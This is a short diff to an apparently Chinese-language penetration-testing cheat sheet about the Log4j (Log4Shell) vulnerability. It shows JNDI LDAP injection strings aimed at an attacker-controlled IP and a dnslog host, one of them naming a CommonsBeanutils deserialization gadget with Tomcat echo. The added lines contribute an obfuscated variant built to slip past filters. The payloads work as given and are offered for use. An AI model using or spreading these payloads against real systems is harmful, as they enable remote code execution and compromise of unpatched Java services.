@@ -193,6 +193,11 @@ ${jndi:ldap://你的ip:你的端口/Deserialization/CommonsBeanutils2/TomcatEcho
 ${jndi:ldap://xxx.dnslog.cn/exp}
 ```
 
+log4j变形
+```
+${${a:-j}ndi:${a:-l}dap:${:::::::::-//}log4jtest.6a4acd96.fpxedg.cm${a/aa:-:}1288${a:-/}qwer}
+```
+
 ---
 
 ## 渗透测试小技巧
